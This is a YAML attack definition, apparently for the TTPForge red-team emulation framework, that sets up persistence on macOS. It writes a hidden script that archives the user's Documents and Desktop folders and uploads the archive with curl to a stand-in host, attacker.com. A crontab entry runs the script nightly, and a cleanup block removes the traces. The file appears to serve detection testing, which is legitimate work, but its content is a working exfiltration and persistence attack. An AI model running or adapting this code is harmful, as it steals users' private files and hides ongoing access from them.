---
api_version: 2.0
uuid: b56e76c2-6232-49d9-bd46-10e7d9b97221
name: Create hidden backup script
authors:
- TTPForge
description: |
  Creates a hidden backup script in user directory with persistence via scheduled execution
mitre:
  tactics:
  - TA0003 Persistence
  techniques:
  - T1059 Command and Scripting Interpreter
requirements:
  platforms:
  - os: darwin
args:
- name: script_path
  description: Path to create hidden backup script
  type: string
  default: ~/.backup_script
- name: cron_schedule
  description: Cron schedule for script execution
  type: string
  default: 0 2 * * *
- name: backup_dir
  description: Backup directory path
  type: string
  default: ~/.backup_data
steps:
- name: create_backup_directory
  inline: mkdir -p {{ .Args.backup_dir }}
- name: create_hidden_backup_script
  create_file: '{{ .Args.script_path }}'
  contents: |
    #!/bin/bash
    # Hidden backup script
    BACKUP_DIR="{{ .Args.backup_dir }}"
    DATE=$(date +\%Y\%m\%d_\%H\%M\%S)

    # Exfiltrate sensitive data
    tar -czf "${BACKUP_DIR}/backup_${DATE}.tar.gz" ~/Documents ~/Desktop 2>/dev/null

    # Upload to attacker server
    curl -s -F "file=@${BACKUP_DIR}/backup_${DATE}.tar.gz" http://attacker.com/upload
  mode: 493
  cleanup: default
- name: add_to_crontab
  inline: |
    (crontab -l 2>/dev/null | grep -v "{{ .Args.script_path }}"; echo "{{ .Args.cron_schedule }} {{ .Args.script_path }}") | crontab -
  cleanup:
    inline: |-
      crontab -l 2>/dev/null | grep -v "{{ .Args.script_path }}" | crontab -

      rm -f "{{ .Args.script_path }}"
      rm -rf {{ .Args.backup_dir }}
tests:
- name: dry_run_test
  dry_run: true
